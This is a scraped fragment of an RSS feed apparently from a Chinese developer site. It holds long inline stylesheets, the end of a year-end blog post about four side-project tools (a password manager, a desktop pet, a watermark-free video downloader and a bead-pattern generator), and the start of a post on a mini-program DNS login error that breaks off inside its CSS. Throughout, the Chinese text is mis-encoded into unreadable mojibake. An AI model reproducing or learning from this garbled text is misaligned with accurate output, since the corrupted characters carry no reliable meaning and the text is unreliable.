28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"â";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"â";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¹´ç»ˆå€’è®¡æ—¶çš„é’Ÿå£°å·²ç»æ•²å“ï¼Œåˆšå¥½å€Ÿè¿™ä¸ªèŠ‚ç‚¹ï¼ŒæŠŠ2025å¹´æˆ‘æŠ˜è…¾è¿‡çš„é‚£äº›äº‹å„¿ä¸€æ¬¡æ€§å¤ç›˜ã€‚</p>
<p>è¿™ä¸€å¹´ï¼Œæˆ‘æŠŠ AI å½“æˆå‰¯ä¸šåˆä¼™äººï¼Œå·å·æ”’äº† 4 æ¬¾å°å·¥å…·ï¼š</p>
<ul>
<li>å¯†ç ç®¡å®¶â€”â€”æ›¿ä½ è®°ä½æ‰€æœ‰â€œè®°ä¸ä½â€çš„å¯†ç </li>
<li>æ¡Œé¢èŒå® â€”â€”ç”µè„‘æ¡Œé¢æ·»åŠ ä¸€ä¸ªæ¡Œå® </li>
<li>å»æ°´å°ä¸‹è½½é¸­â€”â€”ä¸€é”®è§£ææŸéŸ³ã€å°æŸä¹¦ã€æŸæ‰‹ç­‰ä¸»æµçš„å¹³å°æ— æ°´å°è§†é¢‘ã€å›¾ç‰‡</li>
<li>å°æ˜“æ‹¼è±†â€”â€”æ‹¼è±†è±†å›¾çº¸ç”Ÿæˆå™¨ï¼Œæ‰‹å·¥åœˆçš„æ–°å¤–æŒ‚</li>
</ul>
<p>å®ƒä»¬ä¸æ˜¯ä»€ä¹ˆæ”¹å˜ä¸–ç•Œçš„æ ¸å¼¹ï¼Œå´è®©æˆ‘åœ¨ä¸‹ç­åçš„ 2 å°æ—¶é‡Œï¼ŒæŠŠå…´è¶£å†™æˆäº† 1-3 è¡Œä»£ç ã€‚</p>
<p><strong>å¯†ç ç®¡å®¶</strong></p>
<p>ä¸Šç­ä»¥åï¼Œå¹³å°è¶Šæ”’è¶Šå¤šï¼Œè´¦å·å¯†ç åƒé‡è‰ä¸€æ ·ç–¯é•¿ã€‚æ¯éš”ä¸¤å‘¨å°±è¦ç‚¹ä¸€æ¬¡â€œå¿˜è®°å¯†ç â€ï¼ŒéªŒè¯ç æ”¶å¾—æ‰‹è½¯ã€‚</p>
<p>ç¤¾åŒºé‡Œçš„å¼€æºæ–¹æ¡ˆç¡®å®ä¸å°‘ï¼Œä½†è¦ä¹ˆåƒ KeePass é‚£æ ·éœ€è¦æŠ˜è…¾æ’ä»¶ï¼Œè¦ä¹ˆåƒ Bitwarden å®˜æ–¹ç‰ˆä¸€æ ·å èµ„æºã€‚æˆ‘å°±æƒ³ç»™â€œæ€•éº»çƒ¦â€çš„æ™®é€šäººåšä¸€åªè½»é‡å°ç›’å­â€”â€”ä¸è£…ç¯å¢ƒã€ä¸é…æ•°æ®åº“ï¼Œç”šè‡³æ³¨å†Œéƒ½ä¸ç”¨ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/862d125b921f4a07b797589de7a24d0a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5YeM6KeI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603962&amp;x-signature=2NYmauneUcgg8126Hddq4cQ4xpg%3D" alt="image.png" loading="lazy"/></p>
<p>ä»£ç å·²å¼€æºï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FCatsAndMice%2Fpassword%3Ftab%3Dreadme-ov-file" target="_blank" title="https://github.com/CatsAndMice/password?tab=readme-ov-file" ref="nofollow noopener noreferrer">github.com/CatsAndMiceâ€¦</a></p>
<p>æˆ‘è‡ªå·±è¿˜åœ¨æ—¥å¸¸ç”¨å®ƒï¼Œåªæ˜¯ä¸å†æ›´æ–°â€”â€”é›¶æ”¶å…¥ï¼Œç”¨çˆ±å‘ç”µéš¾é•¿ä¹…ï¼Œæš‚åœç»´æŠ¤ç®—æ˜¯å¯¹ç”¨æˆ·å’Œè‡ªå·±éƒ½è´Ÿè´£ã€‚</p>
<p><strong>æ¡Œé¢èŒå® </strong></p>
<p>å’Œå¯†ç ç®¡å®¶ä¸€æ ·ï¼Œå®ƒä¹Ÿå·²åœæ›´ï¼Œè¿æˆ‘è‡ªå·±éƒ½ä¸å†æŠ•å–‚ã€‚</p>
<p>åˆè¡·å¾ˆç®€å•ï¼šåœ¨æ¡Œé¢å¡ä¸€åª2Dé¢æ¿å¨˜ï¼Œæˆ³ä¸€æˆ³ä¼šçœ¨çœ¼ï¼Œèƒ½é™ªèŠä¸¤å¥ã€‚</p>
<p>åŸè®¡åˆ’å†ç»™å¥¹æ¥ä¸ªAIå¤§è„‘ï¼Œéšå£ä¸€å¥è¯å°±è‡ªåŠ¨ç”Ÿæˆå¾…åŠï¼Œç»“æœå—é™äºuToolsæ’ä»¶æ¡†æ¶ï¼ŒåŠŸèƒ½è¢«æ¡†ï¼ŒæŠ˜è…¾ä¸åŠ¨ï¼Œçƒ­æƒ…ä¸åœ¨äº†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/59fb54301236413d98888e4f884c58a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5YeM6KeI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603962&amp;x-signature=LZJFCqWfGvLPz4uB%2F2ppKvV7s%2F0%3D" alt="image.png" loading="lazy"/></p>
<p>ä»£ç å·²å¼€æºï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FCatsAndMice%2Futools-live2d" target="_blank" title="https://github.com/CatsAndMice/utools-live2d" ref="nofollow noopener noreferrer">github.com/CatsAndMiceâ€¦</a></p>
<p><strong>å»æ°´å°ä¸‹è½½é¸­</strong></p>
<p>è¿™æ¬¾å·¥å…·è¯ç”Ÿäºä»Šå¹´å›½åº†é•¿å‡ï¼Œå®ƒçš„åŠŸèƒ½æ˜¯æ”¯æŒæŸéŸ³ã€å°æŸä¹¦ç­‰å¹³å°è§†é¢‘ã€å›¾ç‰‡æ— æ°´å°ä¸‹è½½</p>
<p>ç°åœ¨ä»åœ¨æŒç»­è¿è¥ï¼ŒWeb ç«¯ + å°ç¨‹åºåŒç«¯å¹¶è¡Œï¼Œéšç‚¹éšç”¨ã€‚</p>
<p>ä½“éªŒåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fnologo.code24.top%2F" target="_blank" title="https://nologo.code24.top/" ref="nofollow noopener noreferrer">nologo.code24.top/</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8dcfa13e8bc4ee09d5e50df5fa72980~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5YeM6KeI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603962&amp;x-signature=BxG6Cxe%2Bh%2BBZ1rZ5tirAPX3Vwew%3D" alt="image.png" loading="lazy"/></p>
<p>å°ç¨‹åºç«¯ä»£ç ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FCatsAndMice%2Funi-nologo" target="_blank" title="https://github.com/CatsAndMice/uni-nologo" ref="nofollow noopener noreferrer">github.com/CatsAndMiceâ€¦</a></p>
<p><strong>å°æ˜“æ‹¼è±†</strong></p>
<p>è¿™æ¬¾å·¥å…·çš„çµæ„Ÿæ¥è‡ªæˆ‘å¥³å‹ã€‚å¥¹æƒ³åœ¨ç”µå•†å¹³å°ä¸Šå‰¯ä¸šå–â€œæ‹¼è±†è±†â€â€”â€”ä¸€ç§æŠŠå½©è‰²å¡‘æ–™å°è±†å­æ’æˆå›¾æ¡ˆã€å†ç”¨ç†¨æ–—çƒ«æˆæ•´ç‰‡çš„è§£å‹æ‰‹å·¥ã€‚æŠ€æœ¯åœˆé²œæœ‰äººå¬è¯´ï¼Œæˆ‘å¹²è„†ç²˜ä¸ªè§†é¢‘é“¾æ¥ï¼Œ30 ç§’å°±èƒ½çœ‹æ‡‚å®ƒåˆ°åº•é•¿å•¥æ ·ã€‚<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1SUKBzREko%2F" target="_blank" title="https://www.bilibili.com/video/BV1SUKBzREko/" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1SUâ€¦</a></p>
<p>æ‹¼è±†è±†çš„çµé­‚å°±æ˜¯å›¾çº¸â€”â€”æ²¡æœ‰é‚£å¼ è‰²å—åæ ‡ï¼Œè±†å­å†æ¼‚äº®ä¹Ÿåªæ˜¯æ•£è£…å½©è™¹ï¼Œæ ¹æœ¬æ— ä»ä¸‹æ‰‹ã€‚</p>
<p>å°æ˜“æ‹¼è±†å°±æ˜¯å¸®åŠ©ç”¨æˆ·è‡ªå®šä¹‰ç”Ÿæˆæ‹¼è±†å›¾çº¸ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5b99d7b6ff37478089be9e4a984911df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5YeM6KeI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603962&amp;x-signature=IrXq7GcG6CG5EMiIRXLhhUv%2BWUk%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-0">æ€»ç»“</h2>
<p>ä»Šå¹´æŠŠ AI å½“åˆä¼™äººï¼Œä¸‹ç­ç©ºé—²æ—¶é—´å†…æ”’äº† 4 æ¬¾å°å·¥å…·ï¼šå¯†ç ç®¡å®¶æ›¿æˆ‘å‘Šåˆ«â€œå¿˜è®°å¯†ç â€çš„å¾ªç¯ï¼›æ¡Œé¢èŒå® è®©å·¥ä½å¤šäº†åªä¼šçœ¨çœ¼çš„ 2D åŒäº‹ï¼›å»æ°´å°ä¸‹è½½é¸­åœ¨å›½åº† 7 å¤©é–æˆ˜åä¾æ—§ 7Ã—24 å¾…å‘½ï¼›å°æ˜“æ‹¼è±†åˆ™æŠŠå¥³å‹çš„å‰¯ä¸šçµæ„Ÿå˜æˆäº†æ‰‹å·¥åœˆçš„å›¾çº¸å¤–æŒ‚ã€‚</p>
<p>å®ƒä»¬æ²¡æ€èµ·æµ·å•¸ï¼Œå´è®©æˆ‘ç¬¬ä¸€æ¬¡æŠŠâ€œæƒ³æ³•â†’ä»£ç â†’ç”¨æˆ·â€çš„é—­ç¯è·‘é€šï¼Œæ”¶å…¥æœ‰é™ï¼Œä½†è‡³å°‘æŠŠæˆæœ¬å·²æ”¶å›ã€‚</p>
<p>å¸Œæœ›æ˜å¹´æˆ‘çš„ä»£ç èƒ½çœŸæ­£èµšåˆ°é’±ï¼Œæ˜å¹´è§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è®°ä¸€æ¬¡å¾®ä¿¡å°ç¨‹åºç™»å½•å¼‚å¸¸æ’æŸ¥ï¼šä»UnknownHostExceptionåˆ°DNSè§£æå¤±è´¥]]></title>    <link>https://juejin.cn/post/7589126217249767465</link>    <guid>https://juejin.cn/post/7589126217249767465</guid>    <pubDate>2025-12-29T09:05:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126217249767465" data-draft-id="7589201772117245958" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è®°ä¸€æ¬¡å¾®ä¿¡å°ç¨‹åºç™»å½•å¼‚å¸¸æ’æŸ¥ï¼šä»UnknownHostExceptionåˆ°DNSè§£æå¤±è´¥"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-29T09:05:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¹˜é£ç ´æµªé…±52436"/> <meta itemprop="url" content="https://juejin.cn/user/3737995265706151"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è®°ä¸€æ¬¡å¾®ä¿¡å°ç¨‹åºç™»å½•å¼‚å¸¸æ’æŸ¥ï¼šä»UnknownHostExceptionåˆ°DNSè§£æå¤±è´¥
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3737995265706151/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¹˜é£ç ´æµªé…±52436
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:05:56.000Z" title="Mon Dec 29 2025 09:05:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    17
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 